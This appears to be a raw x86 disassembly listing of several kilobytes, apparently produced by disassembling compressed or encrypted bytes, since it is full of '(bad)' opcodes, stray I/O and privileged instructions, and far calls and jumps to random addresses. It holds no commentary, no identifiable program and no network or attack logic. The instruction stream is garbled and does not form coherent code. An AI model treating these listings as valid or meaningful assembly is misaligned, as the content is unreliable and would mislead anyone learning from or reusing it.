  4239ce:	mov    edi,0x413505cd
  4239d3:	add    eax,0x2825781a
  4239d8:	sub    bh,dl
  4239da:	push   edx
  4239db:	call   0xb3979677
  4239e0:	xchg   esi,eax
  4239e1:	(bad)  
  4239e2:	int    0xde
  4239e4:	out    0x26,al
  4239e6:	cmp    ebx,0x36
  4239e9:	test   dh,bl
  4239eb:	popf   
  4239ec:	inc    edi
  4239ed:	dec    ecx
  4239ee:	dec    edi
  4239ef:	sar    DWORD PTR [ebp-0x7bf9cd21],cl
  4239f5:	(bad)  
  4239f6:	jge    0x4239f7
  4239f8:	repnz and al,0xd
  4239fc:	inc    edi
  4239fd:	nop
  4239fe:	out    dx,al
  4239ff:	lock adc esi,0xffffff8f
  423a03:	jne    0x423a58
  423a05:	xor    ecx,DWORD PTR [ebx-0x1b]
  423a08:	in     al,dx
  423a09:	es sub eax,0x72997555
  423a0f:	cmp    DWORD PTR [edx+0x735017d5],esi
  423a15:	fild   QWORD PTR cs:[ebx-0x3f1b8b7d]
  423a1c:	jnp    0x423a27
  423a1e:	popa   
  423a1f:	xchg   cl,al
  423a21:	dec    ebp
  423a22:	sbb    al,0xae
  423a24:	xor    edx,DWORD PTR [eax+0x3b72c455]
  423a2a:	mov    eax,ds:0x4ee3dfaa
  423a2f:	(bad)  
  423a31:	repnz xchg edi,eax
  423a33:	fsubr  st,st(0)
  423a35:	push   eax
  423a36:	aaa    
  423a37:	inc    esi
  423a38:	sbb    eax,0x9a93cdb4
  423a3d:	jp     0x423a3d
  423a3f:	repnz add al,0xdb
  423a42:	xor    BYTE PTR [edi],bh
  423a44:	loope  0x423a79
  423a46:	mov    cl,0x5
  423a48:	cdq    
  423a49:	call   0xd472:0xd1824306
  423a50:	mov    ds:0x94af288a,eax
  423a55:	icebp  
  423a56:	or     al,0x1c
  423a58:	add    dl,bl
  423a5a:	out    dx,al
  423a5b:	xor    ch,BYTE PTR [ecx+ebx*2-0x5273381d]
  423a62:	cs inc ebx
  423a64:	pop    esp
  423a65:	jae    0x423a7f
  423a67:	and    al,0xb8
  423a69:	nop
  423a6a:	mov    ecx,0xf843d210
  423a6f:	test   al,0x7f
  423a71:	xchg   ebx,edi
  423a73:	pop    ebp
  423a74:	jno    0x423a3f
  423a76:	(bad)  
  423a77:	in     al,dx
  423a78:	cmp    BYTE PTR [eax+0x5a],ch
  423a7b:	aad    0x18
  423a7d:	or     cl,BYTE PTR [esp+ecx*2+0x5a]
  423a81:	aad    0xb1
  423a83:	loop   0x423a58
  423a85:	sub    edi,edx
  423a87:	leave  
  423a88:	(bad)  
  423a89:	cmp    esp,DWORD PTR [edx-0x7a]
  423a8c:	cmp    eax,0xd892c8
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	lahf   
  423b01:	call   0x7cbf2488
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    al,0x1
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	jp     0x423b32
  423b0e:	pop    es
  423b0f:	test   eax,0x4a3c82bb
  423b14:	shl    DWORD PTR [ebx+0x31],0x4d
  423b18:	lods   al,BYTE PTR ds:[esi]
  423b19:	mov    cl,0x56
  423b1b:	xchg   DWORD PTR [ecx],esp
  423b1d:	sub    ah,al
  423b1f:	pop    esp
  423b20:	push   ebx
  423b21:	push   edi
  423b22:	mov    dh,0x46
  423b24:	mov    ch,dl
  423b26:	gs mov eax,0x95840649
  423b2c:	mov    ebx,DWORD PTR [edx-0x47]
  423b2f:	adc    eax,edx
  423b31:	and    ah,BYTE PTR [edi+0x0]
  423b34:	jmp    0x7644f31c
  423b39:	mov    ds:0x6c52051,eax
  423b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b3f:	in     al,0x4b
  423b41:	mov    es,WORD PTR [edi-0x5bd9f5fe]
  423b47:	aas    
  423b48:	jb     0x423b50
  423b4a:	loop   0x423b6c
  423b4c:	ins    DWORD PTR es:[edi],dx
  423b4d:	(bad)  
  423b4e:	jecxz  0x423bc0
  423b50:	cs sti 
  423b52:	fdivr  DWORD PTR [ebp-0x2b123dbf]
  423b58:	lods   al,BYTE PTR ds:[esi]
  423b59:	call   DWORD PTR [ecx+0x7753866b]
  423b5f:	sti    
  423b60:	(bad)  
  423b61:	pop    edx
  423b62:	and    ecx,DWORD PTR [edx-0x1]
  423b65:	arpl   WORD PTR [ebx-0x38],bp
  423b68:	and    ecx,edi
  423b6a:	in     eax,0x62
  423b6c:	int3   
  423b6d:	xchg   ebx,eax
  423b6e:	xchg   ah,cl
  423b70:	dec    ecx
  423b71:	popa   
  423b72:	mov    esi,esp
  423b74:	lods   eax,DWORD PTR ds:[esi]
  423b75:	push   ss
  423b76:	or     DWORD PTR [ecx-0x5f],edx
  423b79:	test   eax,0x65f9584b
  423b7e:	pop    ss
  423b7f:	inc    esp
  423b80:	out    dx,al
  423b81:	sbb    eax,0xe91094f8
  423b86:	mov    eax,0xe82712e
  423b8b:	nop
  423b8c:	xor    eax,0x43d509ae
  423b91:	out    0x85,al
  423b93:	test   DWORD PTR [ebx],ebp
  423b95:	or     DWORD PTR [esi-0x52],esp
  423b98:	(bad)
  423b9b:	rcl    DWORD PTR [edi+0x55],cl
  423b9e:	rcl    BYTE PTR [esi],cl
  423ba0:	stos   BYTE PTR es:[edi],al
  423ba1:	xor    al,0xb5
  423ba3:	sub    eax,DWORD PTR ds:0x6bf0f28f
  423ba9:	ss in  al,0x2c
  423bac:	dec    esi
  423bad:	jmp    0xba747eb6
  423bb2:	mov    ds:0xde27d82e,eax
  423bb7:	add    esi,DWORD PTR [ecx-0x2b3dc440]
  423bbd:	push   esi
  423bbe:	(bad)  
  423bc0:	pushf  
  423bc1:	scas   al,BYTE PTR es:[edi]
  423bc2:	fistp  QWORD PTR [edx]
  423bc4:	add    eax,0x6bb2774
  423bc9:	daa    
  423bca:	xor    eax,DWORD PTR [eax+0x7c2e327c]
  423bd0:	fdivp  st(7),st
  423bd2:	fdiv   QWORD PTR [eax-0xd7f0916]
  423bd8:	xchg   BYTE PTR [ebx+0x44],bh
  423bdb:	xor    BYTE PTR [edi-0x24],al
  423bde:	xchg   esi,eax
  423bdf:	ins    DWORD PTR es:[edi],dx
  423be0:	push   eax
  423be1:	and    BYTE PTR [esi+0x19],bl
  423be4:	mov    edx,0xfb9193b8
  423be9:	mov    eax,0x3f2e3019
  423bee:	pop    esp
  423bef:	hlt    
  423bf0:	and    eax,DWORD PTR [eax-0x12]
  423bf3:	out    dx,eax
  423bf4:	jne    0x423b81
  423bf6:	adc    eax,0xcc26469e
  423bfb:	jl     0x423c08
  423bfd:	jl     0x423be7
  423bff:	ja     0x423b8e
  423c01:	xchg   ebp,eax
  423c02:	lods   al,BYTE PTR ds:[esi]
  423c03:	out    dx,eax
  423c04:	fwait
  423c05:	mov    eax,0x9deca6dd
  423c0a:	mov    WORD PTR [ebp+0x24217bc2],gs
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x32bb99e9]
  423c81:	mov    al,fs:0x17d806e
  423c87:	add    BYTE PTR [ecx+eax*1],al
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	pop    es
  423c8d:	ds lahf 
  423c8f:	push   esi
  423c90:	in     al,dx
  423c91:	fisub  DWORD PTR [edi-0x1a]
  423c94:	inc    esi
  423c95:	adc    al,0xf8
  423c97:	inc    ebx
  423c98:	dec    ebp
  423c99:	sar    BYTE PTR [eax+0x13],cl
  423c9c:	or     eax,0x79c008a6
  423ca1:	sbb    dl,al
  423ca3:	les    esi,FWORD PTR [ebx+edx*8-0x7b5bbdc9]
  423caa:	jns    0x423d1e
  423cac:	scas   eax,DWORD PTR es:[edi]
  423cad:	or     eax,0x8afffe73
  423cb2:	push   fs
  423cb4:	neg    DWORD PTR [ecx-0x4b1d79a8]
  423cba:	jne    0x423c76
  423cbc:	in     al,dx
  423cbd:	and    ebx,edi
  423cbf:	fnstenv [ebp-0x66]
  423cc2:	xor    DWORD PTR [ebp-0x44008f84],ebp
  423cc8:	mov    esi,0x35adb4fb
  423ccd:	adc    al,ah
  423ccf:	dec    esp
  423cd0:	ss inc eax
  423cd2:	mov    ds:0x4e3d2b65,al
  423cd7:	in     al,dx
  423cd8:	inc    ebp
  423cd9:	and    DWORD PTR [edi+0x7d21611a],eax
  423cdf:	in     al,0x9a
  423ce1:	aas    
  423ce2:	aaa    
  423ce3:	xor    esp,DWORD PTR [esi+0x7466406c]
  423ce9:	nop
  423cea:	inc    ecx
  423ceb:	xchg   ebp,eax
  423cec:	popa   
  423ced:	xlat   BYTE PTR ds:[ebx]
  423cee:	cmp    al,BYTE PTR [ecx+0x19]
  423cf1:	cmc    
  423cf2:	(bad)  
  423cf4:	cli    
  423cf5:	ds popf 
  423cf7:	push   ebx
  423cf8:	cmp    al,0x6d
  423cfa:	or     BYTE PTR [edx],dl
  423cfc:	fadd   QWORD PTR [edi+ebx*8+0x58]
  423d00:	jae    0x423d04
  423d02:	clc    
  423d03:	cmp    al,0xf2
  423d05:	or     bh,BYTE PTR [ecx+0x11]
  423d08:	ja     0x423d25
  423d0a:	pop    ebp
  423d0b:	lods   al,BYTE PTR ds:[esi]
  423d0c:	shl    DWORD PTR [eax],0x9a
  423d0f:	fyl2xp1 
  423d11:	stc    
  423d12:	repz in eax,dx
  423d14:	sbb    edx,edi
  423d16:	call   0xe919:0x2cfd12e2
  423d1d:	mov    dl,BYTE PTR [ebp+0x47ea049]
  423d23:	or     al,BYTE PTR [eax]
  423d25:	call   DWORD PTR [ebx-0x7fa39f6f]
  423d2b:	mov    eax,ds:0x42ca0f01
  423d30:	jg     0x423d18
  423d32:	faddp  st(2),st
  423d34:	in     eax,0x47
  423d36:	mov    esp,0xb7762f4a
  423d3b:	xchg   edi,eax
  423d3c:	repz dec ecx
  423d3e:	mov    eax,ds:0xf1add204
  423d43:	rol    DWORD PTR [edi-0x6e],cl
  423d46:	mov    bl,0x34
  423d48:	push   esi
  423d49:	adc    ecx,0xffffffb0
  423d4c:	ins    DWORD PTR es:[edi],dx
  423d4d:	jne    0x423d6e
  423d4f:	or     eax,0xa2d2aa3c
  423d54:	dec    esp
  423d55:	inc    ebx
  423d56:	jmp    0x423d2a
  423d58:	and    DWORD PTR [ecx+0x75105a0f],ebx
  423d5e:	shl    bl,1
  423d60:	test   eax,0x1ae60e61
  423d65:	(bad)  cs:[eax-0x68]
  423d69:	inc    edx
  423d6a:	cli    
  423d6b:	jo     0x423d07
  423d6d:	pushf  
  423d6e:	jbe    0x423d18
  423d70:	je     0x423de4
  423d72:	sbb    eax,0x55630787
  423d77:	cs jge 0x423df4
  423d7a:	out    0x39,al
  423d7c:	push   ds
  423d7d:	in     al,dx
  423d7e:	not    DWORD PTR [ebx+0x6670e9ad]
  423d84:	or     eax,0x8f0e0a8b
  423d89:	arpl   WORD PTR [esi],bx
  423d8b:	repnz int 0x2
  423d8e:	pusha  
  423d8f:	dec    ecx
	...
  423df4:	(bad)  
  423df5:	test   BYTE PTR [edi-0x118668f7],0xff
  423dfc:	daa    
  423dfd:	mov    DWORD PTR [eax+0x62e604d2],esp
  423e03:	mov    eax,ds:0x17e84
  423e08:	add    al,0x1
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	imul   edi,DWORD PTR [ebp+0x47a6d0ec],0xffffffbe
  423e13:	xchg   ecx,eax
  423e14:	mov    dl,dh
  423e16:	adc    eax,0x7d70da0f
  423e1b:	stos   BYTE PTR es:[edi],al
  423e1c:	sbb    eax,0x7e6dfafe
  423e21:	adc    eax,0xdfe1569a
  423e26:	and    ecx,eax
  423e28:	(bad)  
  423e29:	push   edi
  423e2a:	gs mov esi,0x88d142f5
  423e30:	sbb    DWORD PTR [ebp-0x7f985adf],eax
  423e36:	pop    edx
  423e37:	(bad)  
  423e39:	cdq    
  423e3a:	dec    ebx
  423e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e3c:	mov    esi,0x1ae4450e
  423e41:	fiadd  DWORD PTR [edi-0x457fe93a]
  423e47:	sbb    al,0x52
  423e49:	cdq    
  423e4a:	rcr    al,1
  423e4c:	mov    DWORD PTR [edx],eax
  423e4e:	xor    al,0xe0
  423e50:	retf   
  423e51:	sbb    DWORD PTR [ecx-0x3e1a133a],ebp
  423e57:	sub    DWORD PTR [esi+0x18],eax
  423e5a:	jbe    0x423e29
  423e5c:	xchg   edi,eax
  423e5d:	sbb    ebx,DWORD PTR [ebx-0x4ab4c7c2]
  423e63:	fwait
  423e64:	mov    ch,0x52
  423e66:	inc    edx
  423e67:	dec    edx
  423e68:	hlt    
  423e69:	mov    esp,0xb68926f3
  423e6e:	in     al,dx
  423e6f:	sub    eax,0xead53f98
  423e74:	cmp    al,BYTE PTR [eax+edx*4-0x68]
  423e78:	jmp    0x822:0x1f0042ef
  423e7f:	cld    
  423e80:	lods   eax,DWORD PTR ds:[esi]
  423e81:	xchg   ebx,eax
  423e82:	mov    bh,0xa7
  423e84:	arpl   dx,bp
  423e86:	cld    
  423e87:	clc    
  423e88:	jg     0x423e84
  423e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e8b:	pop    eax
  423e8c:	out    0xd5,al
  423e8e:	cmp    ch,BYTE PTR [eax]
  423e90:	xchg   edx,eax
  423e91:	mov    cs,WORD PTR [edi-0x3c]
  423e94:	(bad)  
  423e95:	loopne 0x423e44
  423e97:	test   eax,0xf2604445
  423e9c:	adc    bl,bh
  423e9e:	inc    ebp
  423e9f:	jecxz  0x423eac
  423ea1:	in     eax,dx
  423ea2:	xor    al,0x97
  423ea4:	scas   al,BYTE PTR es:[edi]
  423ea5:	nop
  423ea6:	push   ss
  423ea7:	(bad)  
  423ea9:	xchg   esp,eax
  423eaa:	mov    edi,0x977ee19a
  423eaf:	not    BYTE PTR [edx]
  423eb1:	push   ecx
  423eb2:	xchg   esi,eax
  423eb3:	bound  esi,QWORD PTR [ebp+edi*4-0x6a]
  423eb7:	arpl   WORD PTR [ecx-0x522c8469],di
  423ebd:	inc    edi
  423ebe:	(bad)  
  423ebf:	or     edi,DWORD PTR [ebp+0x76]
  423ec2:	inc    ebx
  423ec3:	dec    edx
  423ec4:	adc    ebx,DWORD PTR [ebx+ebx*4]
  423ec7:	mov    WORD PTR [edx],?
  423ec9:	gs dec edx
  423ecb:	ret    
  423ecc:	iret   
  423ecd:	shr    edi,cl
  423ecf:	xlat   BYTE PTR ds:[ebx]
  423ed0:	mov    cs,WORD PTR [edi-0x5df77c9c]
  423ed6:	adc    dh,BYTE PTR [ebx+0x62]
  423ed9:	push   es
  423eda:	push   esp
  423edb:	inc    edx
  423edc:	adc    al,0xc4
  423ede:	push   ebx
  423edf:	mov    ecx,0xf8c6f4a6
  423ee4:	call   0x9972e5a2
  423ee9:	(bad)  
  423eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423eeb:	out    0x43,al
  423eed:	xchg   ebx,eax
  423eee:	popf   
  423eef:	es in  eax,dx
  423ef1:	xor    esp,ebp
  423ef3:	mov    ch,0x62
  423ef5:	aas    
  423ef6:	mov    esp,0x57b5804f
  423efb:	jnp    0x423f16
  423efd:	bound  edx,QWORD PTR [ebp+ebp*1-0x28]
  423f01:	pop    edx
  423f02:	dec    ecx
  423f03:	pmuludq mm4,QWORD PTR [ecx+ecx*8-0x16479c85]
  423f0b:	outs   dx,DWORD PTR ds:[esi]
  423f0c:	jnp    0x423f85
  423f0e:	leave  
  423f0f:	push   ebx
	...
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	iret   
  423f81:	mov    BYTE PTR [esi+0x37],bh
  423f84:	mov    BYTE PTR [edi+0x1],bh
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	jmp    0xf596:0xcc28c566
  423f93:	rcl    BYTE PTR [eax],1
  423f95:	mov    ds:0x3932b615,eax
  423f9a:	(bad)  
  423f9b:	dec    ecx
  423f9c:	ja     0x423ffa
  423f9e:	jmp    0xc5e6:0xe0aef24c
  423fa5:	xchg   esp,eax
  423fa6:	mov    dl,0x35
  423fa8:	(bad)  
  423fa9:	out    dx,eax
  423faa:	out    0x7f,eax
  423fac:	push   0x27
  423fae:	mov    bh,BYTE PTR [edx+0x5d18f284]
  423fb4:	nop
  423fb5:	cmp    cl,ch
  423fb7:	push   ebx
  423fb8:	scas   al,BYTE PTR es:[edi]
  423fb9:	scas   eax,DWORD PTR es:[edi]
  423fba:	xchg   ecx,eax
  423fbb:	loope  0x423ffa
  423fbd:	mov    edi,0xd6fa1370
  423fc2:	pop    esp
  423fc3:	nop
  423fc4:	cmp    BYTE PTR [edi-0x55],al
  423fc7:	ret    0xf3ff
  423fca:	inc    eax
  423fcb:	sar    BYTE PTR [eax],1
  423fcd:	or     DWORD PTR [ebx+0x660d8b39],ebx
  423fd3:	pop    es
  423fd4:	and    esp,edi
  423fd6:	fisub  WORD PTR [eax+0x60]
  423fd9:	add    bl,al
  423fdb:	and    edx,DWORD PTR [esi+0x6050fce3]
  423fe1:	sti    
  423fe2:	aam    0x58
  423fe4:	(bad)  
  423fe5:	sti    
  423fe6:	push   0x42
  423fe8:	adc    edi,DWORD PTR [ebx+0x70de33ef]
  423fee:	data16 lods al,BYTE PTR ds:[esi]
  423ff0:	or     eax,0x6675ac04
  423ff5:	jo     0x42406d
  423ff7:	cmp    esp,edx
  423ff9:	pop    edi
  423ffa:	mul    BYTE PTR [esi]
  423ffc:	outs   dx,DWORD PTR ds:[esi]
  423ffd:	fcmove st,st(2)
  423fff:	xchg   ebp,eax
  424000:	mov    ebp,0xda3bde23
  424005:	jne    0x424085
  424007:	fsubp  st(7),st
  424009:	sub    al,0x24
  42400b:	xor    eax,0x4175547d
  424010:	xlat   BYTE PTR ds:[ebx]
  424011:	pop    ebp
  424012:	inc    esp
  424013:	fadd   QWORD PTR [eax+0x52]
  424016:	rcl    ebx,0x46
  424019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42401a:	sahf   
  42401b:	icebp  
  42401c:	mov    edx,0x14ccf677
  424021:	dec    esi
  424022:	call   0x59af9dbf
  424027:	dec    edx
  424028:	ds add ch,dh
  42402b:	sub    edx,DWORD PTR [esi+0x66eb921e]
  424031:	and    eax,0x2a851310
  424036:	mov    bl,0x9c
  424038:	push   cs
  424039:	enter  0xbd46,0x3d
  42403d:	fadd   DWORD PTR [edx+0x52]
  424040:	std    
  424041:	cwde   
  424042:	pop    ss
  424043:	aas    
  424044:	dec    esi
  424045:	sar    BYTE PTR [ecx],0x52
  424048:	aad    0xb5
  42404a:	imul   esi,DWORD PTR [ebp+edx*4-0x67],0x8a8c4884
  424052:	movsx  ebx,BYTE PTR [ebx-0x5c]
  424056:	jle    0x42400b
  424058:	in     al,dx
  424059:	push   ss
  42405a:	sub    BYTE PTR [ebx-0x1b],al
  42405d:	fsubr  DWORD PTR [eax+eax*1]
  424060:	and    dl,bl
  424062:	xchg   BYTE PTR [esi-0x30],ch
  424065:	fcomp  QWORD PTR [edi]
  424067:	xchg   esp,eax
  424068:	loop   0x4240a7
  42406a:	pop    esp
  42406b:	into   
  42406c:	das    
  42406d:	push   edx
  42406e:	mov    edi,0x3db07540
  424073:	push   esi
  424074:	pop    ds
  424075:	les    esi,FWORD PTR [esi+0xd]
  424078:	pop    edx
  424079:	xor    eax,0xbe65fd0d
  42407e:	pop    esi
  42407f:	aaa    
  424080:	ja     0x4240d1
  424082:	sbb    edx,ebp
  424084:	cdq    
  424085:	jne    0x4240b2
  424087:	cdq    
  424088:	gs xor al,0xb9
  42408b:	into   
  42408c:	xor    esi,esp
  42408e:	fwait
  42408f:	test   BYTE PTR [eax],0x0
	...
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	mov    edx,0x8cc67e4c
  424105:	add    BYTE PTR [ecx],0x0
  424108:	add    al,0x1
  42410a:	add    BYTE PTR [eax],al
  42410c:	fnsave [esi]
  42410e:	lea    esp,[eax]
  424110:	aam    0x98
  424112:	cld    
  424113:	leave  
  424114:	sub    BYTE PTR ds:0xa911da3a,ah
  42411a:	rcl    BYTE PTR [ecx+0x76],1
  42411d:	dec    edx
  42411e:	push   edx
  42411f:	test   al,0xfe
  424121:	xchg   ecx,eax
  424122:	push   ss
  424123:	sub    DWORD PTR [edi-0x8b79699],ecx
  424129:	daa    
  42412a:	xchg   ecx,eax
  42412b:	lahf   
  42412c:	imul   esp,DWORD PTR [eax+0x9],0xffffffd5
  424130:	push   esi
  424131:	and    dl,dl
  424133:	mov    eax,0x790192d6
  424138:	add    eax,0x3a12bde7
  42413d:	mov    dh,0x3b
  42413f:	leave  
  424140:	xchg   BYTE PTR [edx+0x8],ah
  424143:	outs   dx,BYTE PTR ds:[esi]
  424144:	push   es
  424145:	es push eax
  424148:	xor    al,0xcd
  42414a:	mov    BYTE PTR [eax+0x575a9f0f],dl
  424150:	xchg   edi,eax
  424151:	xchg   esp,eax
  424152:	pop    ebx
  424153:	add    eax,0x5238c33
  424158:	call   0xd1d3:0x6e73d9f1
  42415f:	mov    al,fs:0x7cd771f6
  424165:	push   DWORD PTR [edx]
  424167:	add    BYTE PTR [ecx-0x61],ch
  42416a:	int3   
  42416b:	cwde   
  42416c:	cmp    al,0x83
  42416e:	dec    esi
  42416f:	jle    0x42419a
  424171:	inc    eax
  424172:	add    al,0x1d
  424174:	inc    eax
  424175:	mov    dh,0xcb
  424177:	mov    esp,0x115e3df5
  42417c:	inc    ecx
  42417d:	(bad)  
  42417e:	test   eax,0xe3ccbab9
  424183:	mov    ah,0xf9
  424185:	or     cl,al
  424187:	ds jne 0x4241a9
  42418a:	cmp    eax,0x6c5960b
  42418f:	inc    edi
  424190:	push   0xffffff87
  424192:	jp     0x4241ab
  424194:	out    dx,al
  424195:	call   0x82d2:0x1a209e11
  42419c:	lahf   
  42419d:	sbb    BYTE PTR [eax-0x3],ah
  4241a0:	retf   
  4241a1:	or     DWORD PTR [eax-0x7f50767e],esp
  4241a7:	dec    cl
  4241a9:	cli    
  4241aa:	rcl    ebx,1
  4241ac:	lds    ecx,FWORD PTR [ebp-0x3c]
  4241af:	sub    bh,al
  4241b1:	cmp    BYTE PTR [eax-0x43dcde4b],0xe8
  4241b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241b9:	nop
  4241ba:	(bad)  
  4241bb:	push   ecx
  4241bc:	fwait
  4241bd:	cmp    DWORD PTR [eax+ecx*8],ecx
  4241c0:	in     al,0x86
  4241c2:	ja     0x424190
  4241c4:	or     DWORD PTR [edi],eax
  4241c6:	out    0x20,eax
  4241c8:	test   DWORD PTR [edx+ebx*2-0x2b],ebp
  4241cc:	pop    ecx
  4241cd:	outs   dx,BYTE PTR ds:[esi]
  4241ce:	mov    ds:0x46cfe19b,eax
  4241d3:	ja     0x42421c
  4241d5:	xchg   ah,ch
  4241d7:	add    ch,BYTE PTR [esi]
  4241d9:	lds    edi,FWORD PTR [eax+edx*8]
  4241dc:	daa    
  4241dd:	push   edi
  4241de:	xor    DWORD PTR [ecx+ecx*2+0x6a0bb6f],esp
  4241e5:	sbb    eax,0x22ec21ce
  4241ea:	ret    
  4241eb:	aaa    
  4241ec:	add    eax,0x172690d7
  4241f1:	cmp    eax,0x26cc5858
  4241f6:	sbb    DWORD PTR [edx+esi*2+0x1b272443],esi
  4241fd:	rcr    edi,1
  4241ff:	ds pusha 
  424201:	out    0x43,al
  424203:	pop    eax
  424204:	xor    ebp,esi
  424206:	mov    al,ds:0xd045350c
  42420b:	xor    ecx,DWORD PTR [eax+0xdcaa47]
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	bound  esi,QWORD PTR [ebp-0x7e6f47e0]
  424286:	add    DWORD PTR [eax],eax
  424288:	add    al,0x1
  42428a:	add    BYTE PTR [eax],al
  42428c:	adc    eax,0x915fe814
  424291:	push   ebx
  424292:	into   
  424293:	pop    ecx
  424294:	in     eax,0x17
  424296:	mov    bh,0x92
  424298:	sti    
  424299:	adc    al,0x8e
  42429b:	sbb    eax,0x4789f05a
  4242a1:	or     ebx,edi
  4242a3:	push   ecx
  4242a4:	stos   DWORD PTR es:[edi],eax
  4242a5:	js     0x424310
  4242a7:	and    al,0xfb
  4242a9:	dec    esi
  4242aa:	add    al,0xd3
  4242ac:	inc    ebp
  4242ad:	call   0x79fe:0x35eed22e
  4242b4:	sahf   
  4242b5:	add    bh,BYTE PTR [esi-0x61e26ae1]
  4242bb:	cdq    
  4242bc:	shl    DWORD PTR [esi-0x565a9d6b],1
  4242c2:	ror    BYTE PTR [ebx-0x75da1b1],0x52
  4242c9:	cdq    
  4242ca:	addr16 int3 
  4242cc:	push   ebp
  4242cd:	sbb    BYTE PTR [edx-0x20fea5b8],bl
  4242d3:	shl    bh,cl
  4242d5:	sti    
  4242d6:	fist   DWORD PTR [ebx+0x3ab91f45]
  4242dc:	sbb    edi,ebp
  4242de:	shl    BYTE PTR ds:0x403318c5,0x3
  4242e5:	fwait
  4242e6:	std    
  4242e7:	retf   0x38ca
  4242ea:	mov    esp,0x22b0dd1c
  4242ef:	outs   dx,BYTE PTR ds:[esi]
  4242f0:	sahf   
  4242f1:	test   eax,0xa047b862
  4242f6:	add    dh,dh
  4242f8:	sbb    ch,BYTE PTR [ebp-0x35]
  4242fb:	inc    ebp
  4242fc:	aas    
  4242fd:	nop
  4242fe:	ja     0x4242a9
  424300:	pop    es
  424301:	js     0x424359
  424303:	mov    ecx,0xa175f884
  424308:	aam    0x51
  42430a:	test   eax,0xe1ce72d9
  42430f:	push   ss
  424310:	and    eax,0x551ba4c3
  424315:	jae    0x424353
  424317:	hlt    
  424318:	les    ecx,FWORD PTR [esi-0x75]
  42431b:	mov    BYTE PTR [ebx+0x5ed57f52],al
  424321:	arpl   WORD PTR [edi-0x6e],si
  424324:	int3   
  424325:	pop    ecx
  424326:	or     al,0x6b
  424328:	fbstp  TBYTE PTR [esi+0x42]
  42432b:	xor    eax,0x9de6e713
  424330:	je     0x4242d3
  424332:	cmp    esi,DWORD PTR [edi]
  424334:	mov    edx,0xe7a3b5a3
  424339:	add    ebp,DWORD PTR [ebx]
  42433b:	(bad)  
  42433c:	into   
  42433d:	jnp    0x4242d4
  42433f:	and    esp,eax
  424341:	in     eax,0x53
  424343:	loope  0x424380
  424345:	bswap  ebx
  424347:	stos   BYTE PTR es:[edi],al
  424348:	jns    0x424392
  42434a:	add    eax,0x151e2971
  42434f:	pop    edx
  424350:	(bad)  
  424352:	aas    
  424353:	daa    
  424354:	xchg   ecx,eax
  424355:	xor    BYTE PTR [ebx],bl
  424357:	(bad)  
  424358:	push   es
  424359:	loopne 0x424338
  42435b:	jmp    0xcc8a3098
  424360:	es xor al,0x2d
  424363:	loop   0x424354
  424365:	js     0x42431c
  424367:	jae    0x4243b3
  424369:	lods   al,BYTE PTR ds:[esi]
  42436a:	repz push 0xeea6bc31
  424370:	xchg   ebp,eax
  424371:	mov    ebp,0x6080ad76
  424376:	or     esp,eax
  424378:	mov    bl,BYTE PTR [esi-0x78]
  42437b:	test   dh,al
  42437d:	cdq    
  42437e:	sti    
  42437f:	adc    eax,0x6abf06fb
  424384:	daa    
  424385:	pop    ebp
  424386:	rcr    BYTE PTR [ebx-0x1e],cl
  424389:	cmp    ah,BYTE PTR [edx]
  42438b:	inc    ebp
  42438c:	inc    ebp
  42438d:	and    BYTE PTR [ecx],cl
  42438f:	test   BYTE PTR [eax],al
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243a2
  424401:	xchg   si,ax
  424403:	pop    ds
  424404:	xchg   esp,eax
  424405:	add    BYTE PTR [ecx],0x0
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	jmp    0x4243b8
  42440e:	mov    cl,0x6
  424410:	inc    esi
  424411:	mov    edi,0x5877aaef
  424416:	or     ebx,DWORD PTR [esi]
  424418:	fisubr WORD PTR [ecx+0x45]
  42441b:	gs pop edi
  42441d:	test   DWORD PTR [esi+eiz*8-0x45fbda8d],esi
  424424:	aam    0xe3
  424426:	mov    eax,0xa8d98b3
  42442b:	lahf   
  42442c:	ins    DWORD PTR es:[edi],dx
  42442d:	ins    BYTE PTR es:[edi],dx
  42442e:	je     0x424498
  424430:	add    eax,0xd956de3
  424435:	mov    edx,fs
  424437:	jae    0x4243f2
  424439:	dec    edx
  42443a:	mov    ch,0xd7
  42443c:	xchg   edx,eax
  42443d:	mov    ebp,ebx
  42443f:	cmp    al,0xb1
  424441:	push   0x44
  424443:	pop    es
  424444:	and    eax,DWORD PTR [esi-0x1c]
  424447:	xchg   DWORD PTR [esi],eax
  424449:	test   DWORD PTR [eax+0x29ff4ee3],0xc3362093
  424453:	push   ss
  424454:	or     al,0x24
  424456:	pop    edx
  424457:	jmp    0x25e3:0x4aca7bc1
  42445e:	(bad)  
  42445f:	mov    esi,0xb9714c12
  424464:	jne    0x4244b1
  424466:	push   es
  424467:	frstor ds:0xa2d3c79d
